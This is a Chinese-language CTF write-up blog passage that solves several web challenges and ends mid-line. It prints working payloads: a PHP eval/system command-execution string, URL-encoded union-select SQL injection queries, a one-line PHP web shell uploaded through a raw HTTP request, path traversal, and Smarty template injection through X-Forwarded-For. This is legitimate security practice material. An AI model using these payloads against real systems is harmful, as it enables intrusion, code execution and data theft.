current(get_defined_vars()) 的返回值，即 GLOBALS 数组，所以会指向 GLOBALS 数组的最后一个元素。    </p><p>但在这段代码中，由于 get_defined_vars() 返回的是所有变量数组，而我们是先用 current() 取第一个元素（即 GLOBALS 数组），再用 end() 将其指针移到最后一个元素，但这对于绕过正则过滤和执行命令来说，并非关键，真正关键的是后续如何利用 b 参数来实现命令执行。    </p><p>eval() 函数会对传入的字符串作为 PHP 代码进行解析和执行，将 end(current(get_defined_vars())) 的结果传递给 eval，但此处关键不在于这个 eval 的内容，而在于后面的参数是如何被利用的。  </p><p>&amp;b&#x3D;system(‘cat &#x2F;f*’); ：  </p><p>这里通过 GET 请求传递了一个 b 参数，其值为 system(‘cat &#x2F;f*’);。  </p><p>在 PHP 中，system() 函数用于执行外部程序，并且会输出结果。  </p><p>‘cat &#x2F;f*’ 是一个 Linux 系统命令，cat 用于输出文件内容，&#x2F;f* 是匹配以 &#x2F;f 开头的所有文件，通常在一些 CTF（Capture The Flag）题目中，可能存在 &#x2F;flag.txt 或类似路径的文件存放着标志（flag），所以这个命令意图读取这样的文件内容。  </p><p>结合整个 payload 来看，由于脚本中未对 tgctf2025 参数的有效字符进行严格限制，正则表达式存在漏洞，攻击者可以构造特殊的 PHP 代码并通过 eval 执行，从而实现命令执行等恶意操作，这里的 payload 利用了 get_defined_vars() 来获取变量并结合 b 参数中的 system 函数调用，试图读取服务器上的敏感文件内容，但实际能否成功还取决于服务器环境等其他因素，例如是否允许 system 函数执行等。  </p><p>deepseek:<br>步骤 1：获取所有变量<br>get_defined_vars() 返回当前作用域内的所有变量，包括超全局数组 $_GET。此时，$_GET 包含：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_GET</span> = [<br>    <span class="hljs-string">&#x27;tgctf2025&#x27;</span> =&gt; <span class="hljs-string">&#x27;eval(end(current(get_defined_vars())));&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span><br>];<br></code></pre></td></tr></table></figure><p>步骤 2：提取 $_GET 数组<br>current(get_defined_vars())：current() 返回数组的第一个元素。由于 $_GET 是超全局变量，它在返回的数组中通常位于前列，因此这里获取到 $_GET 数组。  </p><p>end(current(…))：将 $_GET 的内部指针移动到末尾（即参数 b），并返回其值 system(‘cat &#x2F;f*’);。  </p><p>步骤 3：执行命令</p><p>eval(end(current(get_defined_vars()))) 最终执行 system(‘cat &#x2F;f*’);，读取服务器上的 &#x2F;f* 文件（如 &#x2F;flag）。  </p><p>&#x2F;&#x2F; </p><p>我的理解就是：    </p><p>?tgctf2025&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;system(‘cat &#x2F;f*’);<br>先新建一个eval函数<br>然后get_defined_vars()用来返回所有定义的变量，包含全局的非全局的,这两类会被分为两个数组，<br>在用current()选择get_defined_vars()生成的数组中的第一个，因为$_GET为超全局变量，所以会在返回的第一个，而此时get中有两个变量，’tgctf2025’ 和 ‘b’<br>再用end来选取全局变量组成的数组中的最后一个元素，即为b</p><p>然后用最外第二层的eval函数来执行变量$b,<br>而源码中的第一层eval 就是用来执行这两段操作的，相当于我们上传了两段代码  </p><h1 id="SWPUCTF-2021-新生赛-sql"><a href="#SWPUCTF-2021-新生赛-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]sql"></a>[SWPUCTF 2021 新生赛]sql</h1><p>按f12 看到标题提示参数是wllm<br>传一个wllm&#x3D;1看看，这熟悉的绿字，感觉回到了sql-labs<br>再传个2，不回显<br>那简单fuzz一下  </p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs excel">过滤了：<br>空格 <br>+<br>=<br><span class="hljs-built_in">and</span><br>updatexml<br>extr<br>extractvalue<br><br><span class="hljs-number">0</span>&#x27;<span class="hljs-built_in">or</span>%<span class="hljs-number">0</span>aunion%<span class="hljs-number">0</span>aselect%<span class="hljs-number">0</span>a1,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>好嘛，试了好久原来是#它不自己进行url编码  </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%27</span>order<span class="hljs-variable">%0</span>aby<span class="hljs-variable">%0</span>a<span class="hljs-number">3</span><span class="hljs-variable">%23</span><br>测出回显列为<span class="hljs-number">3</span>  <br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span><br><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>database()<span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>group_concat(table_name)from(information_schema.tables)<span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%23</span><br><br>/?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)from(information_schema.tables)<span class="hljs-variable">%23</span><br>Your Password:ALL_PLUGINS<span class="hljs-punctuation">,</span>APPLICAB<br>//不是，我用第二行回显甚至会报错？什么题目环境<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(table_name)from(information_schema.tables)where(table_schema)like(database())<span class="hljs-variable">%23</span><br>Your Password:LTLT_flag<span class="hljs-punctuation">,</span>users<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(column_name)from(information_schema.columns)where(table_name)like(&#x27;LTLT_flag&#x27;)<span class="hljs-variable">%23</span><br>Your Password:id<span class="hljs-punctuation">,</span>flag<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(flag)from(LTLT_flag)<span class="hljs-variable">%23</span><br>NSSCTF&#123;<span class="hljs-number">48</span>f<span class="hljs-number">21</span>b<span class="hljs-number">19</span>-<span class="hljs-keyword">c</span><span class="hljs-number">67</span>b<br>只得到一半<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>(group_concat(flag)from(LTLT_flag))<span class="hljs-variable">%23</span><br>试了一下  <br>reverse，<br>left<br>都不能用<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>mid(group_concat(flag)<span class="hljs-punctuation">,</span><span class="hljs-number">20</span><span class="hljs-punctuation">,</span><span class="hljs-number">40</span>)from(LTLT_flag)<span class="hljs-variable">%23</span><br>mid函数试了好久，看wp才知道正确用法😫<br>b<span class="hljs-number">-47</span>a<span class="hljs-number">5</span><span class="hljs-number">-8</span>cdf<span class="hljs-number">-17841</span>a<span class="hljs-number">4</span>e<br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-variable">%27</span>union<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>mid(group_concat(flag)<span class="hljs-punctuation">,</span><span class="hljs-number">40</span><span class="hljs-punctuation">,</span><span class="hljs-number">60</span>)from(LTLT_flag)<span class="hljs-variable">%23</span><br>ca<span class="hljs-number">1</span><span class="hljs-keyword">c</span>&#125;<br><br>NSSCTF&#123;<span class="hljs-number">48</span>f<span class="hljs-number">21</span>b<span class="hljs-number">19</span>-<span class="hljs-keyword">c</span><span class="hljs-number">67</span>b<span class="hljs-number">-47</span>a<span class="hljs-number">5</span><span class="hljs-number">-8</span>cdf<span class="hljs-number">-17841</span>a<span class="hljs-number">4</span>eca<span class="hljs-number">1</span><span class="hljs-keyword">c</span>&#125;<br></code></pre></td></tr></table></figure><p>总结，不能小看啊，太久不做容易在小地方犯错，比如url编码，mid函数使用,幸好大方向是对的，给一个安心看别人wp得理由啊啊🤣</p><h1 id="MoeCTF-垫刀之路01-MoeCTF？启动！"><a href="#MoeCTF-垫刀之路01-MoeCTF？启动！" class="headerlink" title="MoeCTF 垫刀之路01: MoeCTF？启动！"></a>MoeCTF 垫刀之路01: MoeCTF？启动！</h1><p>ls &#x2F; 查看根目录  </p><p>cat &#x2F;flag<br>提示flag不在这，去看系统环境  </p><p>env<br>拿到flag</p><h1 id="MoeCTF-垫刀之路02-普通的文件上传"><a href="#MoeCTF-垫刀之路02-普通的文件上传" class="headerlink" title="MoeCTF 垫刀之路02: 普通的文件上传"></a>MoeCTF 垫刀之路02: 普通的文件上传</h1><p>直接传php马  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);<br></code></pre></td></tr></table></figure><p>然后用蚂蚁连或者直接post一个env就能看到flag</p><h1 id="MoeCTF-垫刀之路03-这是一个图床"><a href="#MoeCTF-垫刀之路03-这是一个图床" class="headerlink" title="MoeCTF 垫刀之路03: 这是一个图床"></a>MoeCTF 垫刀之路03: 这是一个图床</h1><p>只在前端做了限制，改前端代码或者bp抓包传就行</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:13280<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>209<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryJHC9baVxiUBdxw4G<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:13280<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:13280/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-php">------WebKitFormBoundaryJHC9baVxiUBdxw4G</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;image&quot;</span>; filename=<span class="hljs-string">&quot;shell.php&quot;</span></span><br><span class="language-php">Content-Type: image/png</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);</span><br><span class="language-php">------WebKitFormBoundaryJHC9baVxiUBdxw4G--</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>传完后蚂蚁直接连<br>同样查看环境拿到flag  </p><h1 id="MoeCTF-垫刀之路04-一个文件浏览器"><a href="#MoeCTF-垫刀之路04-一个文件浏览器" class="headerlink" title="MoeCTF 垫刀之路04: 一个文件浏览器"></a>MoeCTF 垫刀之路04: 一个文件浏览器</h1><p>java站点，直接在url就能目录穿越，然后就是手工找flag。。。<br>flag目录：<br>?path&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;tmp&#x2F;flag  </p><h1 id="MoeCTF-ProveYourLove"><a href="#MoeCTF-ProveYourLove" class="headerlink" title="MoeCTF ProveYourLove"></a>MoeCTF ProveYourLove</h1><p>根据题目提示传够 300次就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>data = &#123;<span class="hljs-string">&quot;nickname&quot;</span>:<span class="hljs-string">&quot;mignon&quot;</span>,<span class="hljs-string">&quot;user_gender&quot;</span>:<span class="hljs-string">&quot;male&quot;</span>,<span class="hljs-string">&quot;target&quot;</span>:<span class="hljs-string">&quot;nm&quot;</span>,<span class="hljs-string">&quot;target_gender&quot;</span>:<span class="hljs-string">&quot;male&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;anonymous&quot;</span>:<span class="hljs-string">&quot;false&quot;</span>&#125;<br>url = <span class="hljs-string">&#x27;http://127.0.0.1:42701/questionnaire&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">300</span>):<br>    qq = requests.post(url,json=data)<br>    <span class="hljs-built_in">print</span>(qq.text)<br></code></pre></td></tr></table></figure><h1 id="Moe-CTF-静态网页"><a href="#Moe-CTF-静态网页" class="headerlink" title="Moe CTF 静态网页"></a>Moe CTF 静态网页</h1><p>点击看板娘，会在bp看到发包并且有个传参，在浏览器访问并且改id&#x3D;1<br>在最下面看到final1l1l_challenge.php<br>直接访问<br>得到  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;final1l1l_challenge.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$a</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$b</span>)) &#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-variable">$b</span>[<span class="hljs-variable">$a</span>]) &#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;noooooooooooo&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Notice the param type!&#x27;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Where is your param?&#x27;</span>);<br>&#125; Where is your param?<br></code></pre></td></tr></table></figure><p>要求 a和b都不是数字<br>a等于0，并且a的md5值等于b的数组的a?<br>有点乱  </p><p>这个绕不过，看到网上有两种解法  </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1</span>:<br>意思是让我们<span class="hljs-built_in">get</span>输入<span class="hljs-keyword">a</span>，<span class="hljs-built_in">post</span>输入b，且两个变量都不是数字，然后<span class="hljs-keyword">a</span>弱相等等于<span class="hljs-number">0</span>，md5($<span class="hljs-keyword">a</span>)和b的第$<span class="hljs-keyword">a</span>个元素弱相等，那其实只要<span class="hljs-keyword">a</span>第一位数字是字母，md5($<span class="hljs-keyword">a</span>)为经典<span class="hljs-number">0</span>e开头数字，b随便取个<span class="hljs-number">0</span>k就行，构造?<span class="hljs-keyword">a</span>=QNKCDZO,<span class="hljs-built_in">post</span>输入b=<span class="hljs-number">0</span>k就可以了。得到flag。<br><br>出题人自己的解法：<br>后半部分要求是 md5($<span class="hljs-keyword">a</span>) == $b[$<span class="hljs-keyword">a</span>]，有的师傅可能认为这是 md5 绕过，并且说绕不过去。其实只要静下来定睛一看就能看出来，这个表达式其实并没有对 <span class="hljs-keyword">a</span> 参数做出任何限制，全是对 b 的限制。所以细看就能知道，我们要求的是 b[<span class="hljs-keyword">a</span>] 就是 <span class="hljs-keyword">a</span> 的 md5 值。至于如何赋值，请看下文：<br><br>GET: ?<span class="hljs-keyword">a</span>=<span class="hljs-number">0</span><span class="hljs-keyword">a</span><br>POST:<br>b[<span class="hljs-number">0</span><span class="hljs-keyword">a</span>]=e99bb33727d338314912e86fbdec87af<br><br>可以看到，想要传数组，直接把 <span class="hljs-keyword">a</span> 的值丢进中括号就行了。b 的值就是 <span class="hljs-number">0</span><span class="hljs-keyword">a</span> 的 md5 值。<br></code></pre></td></tr></table></figure><p>按照出题的说法试了一下<br>a&#x3D;0b<br>b[0b]&#x3D;347017fd1e37a22faf91875981bc4fb3<br>确实可以了<br>原来还可以这样传数组啊  </p><h1 id="2019-强网杯-高明的黑客"><a href="#2019-强网杯-高明的黑客" class="headerlink" title="2019 强网杯 高明的黑客"></a>2019 强网杯 高明的黑客</h1><p>下源码看了一眼吓哭了，几千个php文件<br>网上的wp说是用脚本来测试每个php文件里留下的马能否用<br>没做，记一下思路  </p><h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>打开题目发现有flag一栏，点开发现会显示<br>Your IP is : 192.168.122.15<br>bp抓爆就知道了  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flag.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: node5.buuoj.cn:<span class="hljs-number">25798</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://node5.buuoj.cn:<span class="hljs-number">25798</span>/index.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><br></code></pre></td></tr></table></figure><p>明明是正常的请求头啊  </p><p>打开hint看看，里面有说：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- Do you know why i know your ip? --&gt;</span><br></code></pre></td></tr></table></figure><p>想到了是要添加ip，但是忘了该怎么自定义请求ip<br>上网搜<br>是<br>X-Forwarded-For:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flag.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: node5.buuoj.cn:<span class="hljs-number">25798</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">111.111.111.111</span><br></code></pre></td></tr></table></figure><p>成功回显指定ip<br>不知道为什么传了一次;就再也不能指定ip来回显了  </p><p>算了看wp吧<br>看了半天竟然是模板注入  </p><p>传了一次传了一次;就再也不能指定ip来回显了<br>这个问题用bp的添加请求头来解决<br>照着wp做就行</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ls</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is :</span><br><span class="language-xml">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error in template &quot;string:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ls</span>&#125;&#125;</span><span class="language-xml">&quot; on line 1 &quot;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ls</span>&#125;&#125;</span><span class="language-xml">&quot; unknown tag &#x27;ls&#x27; &lt;-- thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 1</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span>)&#125;&#125;</span><span class="language-xml"></span><br><span 